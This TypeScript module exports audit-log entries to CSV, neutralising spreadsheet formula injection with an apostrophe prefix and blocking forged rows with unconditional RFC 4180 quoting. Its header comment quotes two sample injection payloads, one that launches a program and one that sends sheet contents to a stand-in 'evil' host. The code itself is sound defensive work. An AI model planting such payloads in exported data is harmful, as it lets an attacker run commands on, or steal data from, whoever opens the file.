import { actionName } from "./actions";
import type { RawAuditEvent } from "./events";

/**
 * CSV export of audit entries.
 *
 * Two hazards, both handled here rather than at the call site.
 *
 * **Formula injection.** A CSV is not an inert document — Excel, LibreOffice and Sheets
 * evaluate any cell beginning with `=`, `+`, `-` or `@` as a formula, and a formula can
 * reach the shell (`=cmd|'/c calc'!A1`) or exfiltrate the sheet
 * (`=IMPORTXML("//evil/"&A1,"//x")`). The attacker does not need to breach the API: they
 * need one field on-chain that an ADMIN later exports and opens. Every field is therefore
 * prefixed with an apostrophe when it opens with a trigger character, which spreadsheets
 * read as "this is text". Tab and carriage return are triggers too, because a leading
 * whitespace character is stripped before the formula check in some parsers.
 *
 * **Injected line breaks.** RFC 4180 quoting handles embedded newlines correctly, but a
 * field containing a CRLF that escapes its quoting turns one row into two — a forged audit
 * record inside a genuine export. Quoting is applied to every field rather than only the
 * ones that appear to need it, so there is no predicate to get wrong.
 */

const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

export const CSV_COLUMNS = [
  "entryId",
  "timestamp",
  "action",
  "actionCode",
  "actor",
  "didHash",
  "refHash",
  "via",
  "blockNumber",
  "transactionHash",
] as const;

/** Escapes one field: neutralise a formula, then quote per RFC 4180. */
export function csvField(value: unknown): string {
  const text = value === null || value === undefined ? "" : String(value);
  const guarded = text.length > 0 && FORMULA_TRIGGERS.has(text[0] as string) ? `'${text}` : text;

  // Always quoted, and internal quotes doubled. Unconditional quoting means an embedded
  // comma, quote or newline cannot break the row shape.
  return `"${guarded.replace(/"/g, '""')}"`;
}

export function csvRow(values: readonly unknown[]): string {
  return `${values.map(csvField).join(",")}\r\n`;
}

export function csvHeader(): string {
  return csvRow(CSV_COLUMNS);
}

export function auditEventToRow(event: RawAuditEvent): string {
  return csvRow([
    event.entryId,
    new Date(event.timestamp * 1000).toISOString(),
    actionName(event.actionCode),
    event.actionCode,
    event.actor ?? "",
    event.didHash,
    event.refHash,
    event.via,
    event.blockNumber,
    event.transactionHash,
  ]);
}

/**
 * Yields an export as a sequence of chunks, one page at a time.
 *
 * A generator rather than an array because an export is unbounded: the audit trail only
 * grows, and buffering a year of entries to build one string is how an export endpoint
 * becomes the way to run the API out of memory. Pages are fetched lazily and written
 * through, so peak memory is one page regardless of total size.
 *
 * `maxRows` is a hard stop. It is not a paging limit — it is the point at which the
 * export is declared too large to serve synchronously, and the caller is told so rather
 * than handed a file that is silently incomplete.
 */
export async function* streamAuditCsv(options: {
  fetchPage: (beforeEntryId: number | undefined) => Promise<RawAuditEvent[]>;
  maxRows: number;
}): AsyncGenerator<string, void, undefined> {
  yield csvHeader();

  let cursor: number | undefined;
  let written = 0;

  for (;;) {
    const page = await options.fetchPage(cursor);
    if (page.length === 0) return;

    for (const event of page) {
      if (written >= options.maxRows) {
        // Recorded in the file itself. A truncated export that does not say it was
        // truncated is a false record, which is worse than no export.
        yield csvRow([`export truncated at ${options.maxRows} rows`]);
        return;
      }
      yield auditEventToRow(event);
      written += 1;
    }

    const last = page[page.length - 1];
    if (!last) return;
    cursor = last.entryId;
    if (last.entryId === 0) return;
  }
}
